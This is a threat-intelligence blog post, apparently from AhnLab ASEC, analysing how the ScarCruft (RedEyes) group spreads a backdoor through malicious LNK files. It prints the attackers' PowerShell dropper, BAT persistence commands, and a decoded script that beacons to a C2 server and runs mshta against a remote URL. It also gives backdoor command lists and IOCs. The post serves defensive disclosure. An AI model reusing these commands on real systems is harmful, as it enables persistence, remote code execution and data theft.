# Reference for threat actor for "Reaper, APT 37, Ricochet Chollima, ScarCruft"

**Title**: Distribution of Backdoor via Malicious LNK: RedEyes (ScarCruft) - ASEC BLOG

**Source**: https://asec.ahnlab.com/en/56756/

## Content

















Distribution of Backdoor via Malicious LNK: RedEyes (ScarCruft) - ASEC BLOG




































































 

Malware Information
AhnLab Detection
Statistics
Response Guide
AhnLab
 














Posted By yeeun  , September 6, 2023 

Distribution of Backdoor via Malicious LNK: RedEyes (ScarCruft) 
AhnLab Security Emergency response Center (ASEC) has confirmed that malware [1], which was previously distributed in CHM format, is now being distributed in LNK format. This malware executes additional scripts located at a specific URL through the mshta process. It then receives commands from the threat actor’s server to carry out additional malicious behaviors.
The threat actor has been distributing the confirmed LNK file on a regular website by uploading it alongside malware within a compressed file.

Figure 1. Malware found at hxxp://a*****fo.co.kr/member/
The malicious LNK file has been uploaded under the file name ‘REPORT.ZIP.’ Similar to the malware identified in <RokRAT Malware Distributed Through LNK Files (*.lnk): RedEyes (ScarCruft)> [2], this file has an LNK that contains normal Excel document data and malicious script code.

Figure 2. Compressed file containing malicious LNK file

Figure 3. Additional file data included inside the LNK
Therefore, when the ‘Status Survey Table.xlsx.lnk’ file is executed, it creates and executes a normal document called ‘Status Survey Table.xlsx’ and the malicious script ‘PMmVvG56FLC9y.bat’ in the %Temp% folder through PowerShell commands.
/c powershell -windowstyle hidden $pEbjEn = Get-Location;if($pEbjEn -Match 'System32' -or $pEbjEn -Match 'Program Files') {$pEbjEn = '%temp%'};$lyHWPSj = Get-ChildItem -Path $pEbjEn -Recurse *.lnk ^| where-object {$_.length -eq 0x18C0000} ^| Select-Object -ExpandProperty FullName;if($lyHWPSj.GetType() -Match 'Object'){$lyHWPSj = $lyHWPSj[0];};$lyHWPSj;$C5ytw = gc $lyHWPSj -Encoding Byte -TotalCount 74240 -ReadCount 74240;$tyxkEP = '%temp%\Status Survey Table.xlsx';sc $tyxkEP ([byte[]]($C5ytw ^| select -Skip 62464)) -Encoding Byte; ^& $tyxkEP;$Cbe1yj = gc $lyHWPSj -Encoding Byte -TotalCount 79888 -ReadCount 79888;$WH9lSPHOFI = '%temp%\PMmVvG56FLC9y.bat';sc $WH9lSPHOFI ([byte[]]($Cbe1yj ^| select -Skip 74342)) -Encoding Byte;^& %windir%\SysWOW64\cmd.exe /c $WH9lSPHOFI;
‘Status Survey Table.xlsx’ appears as a normal Excel document and impersonates a Korean public organization in the following manner.

Figure 4. Contents and properties of ‘Status Survey Table.xlsx’
When the concurrently generated ‘PMmVvG56FLC9y.bat’ file is executed, it is copied into the ‘%appdata%\Microsoft\Protect\’ folder as ‘UserProfileSafeBackup.bat’. Afterward, it is registered in the following registry to ensure continuous execution of the BAT file.

Registry path: HKCU\ Software\Microsoft\Windows\CurrentVersion\RunOnce
Value name: BackupUserProfiles
Value: C:\Windows\SysWOW64\cmd.exe /c %appdata%\Microsoft\Protect\UserProfileSafeBackup.bat

After registering to the above registry, a PowerShell command in hexadecimal format inside the BAT file is executed.
copy %~f0 "%appdata%\Microsoft\Protect\UserProfileSafeBackup.bat"
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v BackupUserProfiles /t REG_SZ /f /d "C:\Windows\SysWOW64\cmd.exe /c %appdata%\Microsoft\Protect\UserProfileSafeBackup.bat"
start /min C:\Windows\SysWOW64\cmd.exe /c powershell -windowstyle hidden -command 
"$m6drsidu ="$jWHmcU="""53746172742D536C656570202D<omitted>""";$nj4KKFFRe="""""";for($xlEKy9tdBWJ=0;$xlEKy9tdBWJ -le $jWHmcU.Length-2;$xlEKy9tdBWJ=$xlEKy9tdBWJ+2){$dYaD=$jWHmcU[$xlEKy9tdBWJ]+$jWHmcU[$xlEKy9tdBWJ+1];$nj4KKFFRe= $nj4KKFFRe+[char]([convert]::toint16($dYaD,16));};
Invoke-Command -ScriptBlock ([Scriptblock]::Create($nj4KKFFRe));";
Invoke-Command -ScriptBlock ([Scriptblock]::Create($m6drsidu));"
When the PowerShell command is executed, a Run key registration is carried out alongside the execution of additional scripts utilizing mshta. Furthermore, registry registrations can be performed through commands from the threat actor. The following is a portion of the PowerShell command represented in hexadecimal format within the code of the BAT file.
Start-Sleep -Seconds 67;
$nvSklUbaQ = 1024 * 1024;
$yixgsFVy = $env:COMPUTERNAME + '-' + $env:USERNAME+'-SH';
$aWw = 'hxxp://75.119.136[.]207/config/bases/config.php' + '?U=' + $yixgsFVy;
$bLmoifqHwJxhE = $env:TEMP + '/KsK';
if (!(Test-Path $bLmoifqHwJxhE)) { New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name Olm -Value 'c:\windows\system32\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 311714 2.2.2.2 || mshta hxxp://bian0151.cafe24[.]com/admin/board/1.html' -PropertyType String -Force;}
The confirmed C2 and malicious URLs are as follows:

hxxp://75.119.136[.]207/config/bases/config.php?U=[COMPUTERNAME]-[USERNAME]-SH // Receives commands from the threat actor
hxxp://75.119.136.207/config/bases/config.php?R=[‘EOF’ encoded in base64] // Transmits command execution results
hxxp://bian0151.cafe24[.]com/admin/board/1.html // Downloads additional script codes

The additional script codes (hxxp://bian0151.cafe24.com/admin/board/1.html) executed through mshta contain a PowerShell command obfuscated in Base64 as shown below. This command performs functions similar to those previously disclosed in Table 1 of the post <RedEyes Group Wiretapping Individuals (APT37)> [3].

Figure 5. Malicious script found at hxxp://bian0151.cafe24.com/admin/board/1.html
The decoded PowerShell command receives and processes commands from the threat actor at hxxp://75.119.136[.]207/config/bases/config.php?U=[COMPUTERNAME]-[USERNAME]-SH. Figure 6 shows a portion of the decoded PowerShell command.

Figure 6. Decoded PowerShell command
The commands and features that can be performed are as follows.
CommandFeaturepcinfoCollects PC informationdriveCollects drive informationclipboardCollects clipboard contentsvcCollects service informationprocessCollects information on running processesfileinfoCollects the names, sizes, last used dates, and complete paths for the subfiles in the received pathstartExecutes received command through cmdpluginDownloads and executes additional files through PowerShelldownDownloads additional files in the received pathupUploads files from the received pathregeditAdds to the registrycompressCompresses filesTable 1. Commands and features that can be performed
It is suspected that the attacker is continuously modifying the script code, as the commands listed in Table 1 differ from those previously identified. Therefore, in addition to the functionalities confirmed so far, various other malicious activities may also be performed.
Aside from the LNK file, the compressed files ‘KB_20230531.rar’, ‘attachment.rar’, and ‘hanacard_20230610.rar’ that were identified alongside ‘REPORT.ZIP’ in Figure 1, also contain the previously identified malicious CHM file. Similar to the LNK file described earlier, this CHM file is malware that utilizes mshta to execute additional scripts located at specific URLs.

Figure 7. Compressed files containing a malicious CHM file
Due to the recent mass distribution of malware utilizing CHM and LNK files, users need to exercise extra caution. In the case of the malicious LNK files, it has been observed that a significant number of them have a file size exceeding 10 MB. Therefore, users must refrain from executing large LNK files from unknown sources.
[File Detection]Dropper/LNK.Generic.S2241 (2023.04.24.02)Trojan/BAT.PsExec.S2247 (2023.06.13.02)Downloader/Script.Generic.SC191708 (2023.08.17.03)
[Behavior Detection]DefenseEvasion/DETECT.T1059.M11294DefenseEvasion/DETECT.T1059.M11295 
[IOC]0eb8db3cbde470407f942fd63afe42b82d444b6f72c8327d1d155faa2cca7fd727f74072d6268b5d96d73107c560d852hxxp://75.119.136[.]207/config/bases/config.php
Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information.


Categories:Malware Information 
Tagged as:chm,lnk,RedEyes,ScarCruft 




Tracking Fileless Malware Distributed Through Spam Mails 

Phishing Script File Breaching User Information via Telegram Being Distributed 







5
1
vote
Article Rating

 





 Subscribe




 Login 




Notify of 


new follow-up comments
new replies to my comments








 







 


Label












{}
[+]

 















Name*





Email





Website






[Important] Consent to Collection and Use of Personal Information


Purpose: Identify the contact information of user who left a comment and respond to inquiries on our blog posts.
Personal Information We Collect: Name of user and organization, Email address
Period of Retention: We store personal information for 3 months. Then, we delete and destroy personal information without delay.

 



I agree to AhnLab’s collection and use of personal information.




















Δ 










 


Label












{}
[+]

 















Name*





Email





Website






[Important] Consent to Collection and Use of Personal Information


Purpose: Identify the contact information of user who left a comment and respond to inquiries on our blog posts.
Personal Information We Collect: Name of user and organization, Email address
Period of Retention: We store personal information for 3 months. Then, we delete and destroy personal information without delay.

 



I agree to AhnLab’s collection and use of personal information.




















Δ 






30 Comments                    









 Inline Feedbacks                    
View all comments











Distribution of Backdoor via Malicious LNK: RedEyes (ScarCruft) - Ciberdefensa



    5 months ago













[…] post Distribution of Backdoor via Malicious LNK: RedEyes (ScarCruft) appeared first on ASEC […]






0






Reply













Hackers Use Weaponized LNK Files to Deploy RedEyes Malware - h4ckers-news



    5 months ago













[…] Experts believe the threat actor is continuously modifying the script code, making it challenging to predict their future actions.  […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers - The Kilguard



    5 months ago













[…] disclosure comes because the AhnLab Safety Emergency Response Heart (ASEC) revealed that North Korean nation-state actor referred to as ScarCruft is leveraging LNK file lures in […]






0






Reply













North Korean Hackers Exploit 0-Day Worm to Goal Cybersecurity Researchers -



    5 months ago













[…] disclosure comes because the AhnLab Safety Emergency Reaction Heart (ASEC) published that North Korean countryside actor referred to as ScarCruft is leveraging LNK record lures in […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers - Tether Investor



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers - Vived Solutions Ltd



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Goal Cybersecurity Researchers – informatify.net



    5 months ago













[…] disclosure comes because the AhnLab Safety Emergency Response Middle (ASEC) revealed that North Korean nation-state actor often called ScarCruft is leveraging LNK file lures in […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers – Cyber Social Hub



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













Des pirates nord-coréens exploitent un bug Zero-Day pour cibler les chercheurs en cybersécurité - Teknomers Nouvelles



    5 months ago













[…] divulgation intervient alors que l’AhnLab Security Emergency Response Center (ASEC) révélé que l’acteur étatique nord-coréen connu sous le nom de ScarCruft exploite les leurres de […]






0






Reply













Los piratas informáticos norcoreanos aprovechan el error de día cero para atacar a los investigadores de ciberseguridad - Teknomers Noticias



    5 months ago













[…] divulgación se produce cuando el Centro de Respuesta a Emergencias de Seguridad de AhnLab (ASEC) reveló Ese actor-estado-nación de Corea del Norte conocido como ScarCruft está aprovechando los […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers - Digital Creations LLC



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













Kuzey Koreli Hackerlar Siber Güvenlik Araştırmacılarını Hedef Almak İçin Sıfır Gün Hatasından Yararlanıyor - Dünyadan Güncel Teknoloji Haberleri | Teknomers



    5 months ago













[…] AhnLab Güvenlik Acil Durum Müdahale Merkezi (ASEC) olarak geliyor. açıklığa kavuşmuş ScarCruft olarak bilinen Kuzey Koreli ulus devlet aktörünün, hassas verileri toplayabilen ve […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers - iFashionTrendz



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers – The Hacker News – AI Live News



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers – Cloud Karamchari



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers – Securitydone



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers – Solar Kat



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers - The Network Company | Cyber Security | IT Services | Network Security



    5 months ago













[…] (C2) domain.The disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers – Flyytech.com



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit 0-Day Worm to Goal Cybersecurity Researchers -



    5 months ago













[…] disclosure comes because the AhnLab Safety Emergency Reaction Middle (ASEC) printed that North Korean geographical region actor referred to as ScarCruft is leveraging LNK record lures […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers - SwapUpdate



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Goal Cybersecurity Researchers - CreatorTechs. All rights reserved.



    5 months ago













[…] disclosure comes because the AhnLab Safety Emergency Response Heart (ASEC) revealed that North Korean nation-state actor often called ScarCruft is leveraging LNK file lures in […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers - Tech News



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Goal Cybersecurity Researchers - techwithtrends.com



    5 months ago













[…] disclosure comes because the AhnLab Safety Emergency Response Middle (ASEC) revealed that North Korean nation-state actor often known as ScarCruft is leveraging LNK file lures in […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers - primez.online



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers - Buzz4All



    5 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that the North Korean state actor known as ScarCruft exploits LNK file lures in phishing emails to […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers - Geek Tech Guru



    5 months ago













[…] disclosure comes because the AhnLab Safety Emergency Response Middle (ASEC) revealed that North Korean nation-state actor generally known as ScarCruft is leveraging LNK file lures in […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity Researchers | saudiresta.com



    4 months ago













[…] disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply













North Korean Hackers Exploit Zero-Day Bug to Target Cybersecurity ... - The Hacker News | NV Technologies



    4 months ago













[…] (C2) domain.The disclosure comes as the AhnLab Security Emergency Response Center (ASEC) revealed that North Korean nation-state actor known as ScarCruft is leveraging LNK file lures in phishing […]






0






Reply




 













Archives Archives

Select Month
 February 2024 
 January 2024 
 December 2023 
 November 2023 
 October 2023 
 September 2023 
 August 2023 
 July 2023 
 June 2023 
 May 2023 
 April 2023 
 March 2023 
 February 2023 
 January 2023 
 December 2022 
 November 2022 
 October 2022 
 September 2022 
 August 2022 
 July 2022 
 June 2022 
 May 2022 
 April 2022 
 March 2022 
 February 2022 
 January 2022 
 December 2021 
 November 2021 
 October 2021 
 September 2021 
 August 2021 
 July 2021 
 June 2021 
 May 2021 
 April 2021 
 March 2021 
 February 2021 
 January 2021 
 December 2020 
 November 2020 
 September 2020 
 August 2020 
 July 2020 
 June 2020 
 May 2020 
 April 2020 
 March 2020 
 February 2020 
 December 2019 
 November 2019 
 October 2019 
 September 2019 
 August 2019 
 June 2019 
 May 2019 
 April 2019 
 March 2019 
 February 2019 
 January 2019 
 November 2018 
 July 2018 
 April 2018 
 February 2018 


FOLLOW US


LinkedIn   


X   


RSS Feed   









footer(en) 220, Pangyoyeok-ro, Bundang-gu, Seongnam-si, Gyeonggi-do, Korea | Privacy & Security© AhnLab, Inc. All rights reserved.family site


한국 (한국어)
Global (English)
日本 (日本語)
 




wpDiscuzInsert 









 




















































































Loading Comments...



 


Write a Comment...




Email



Name



Website

















































































































































































































































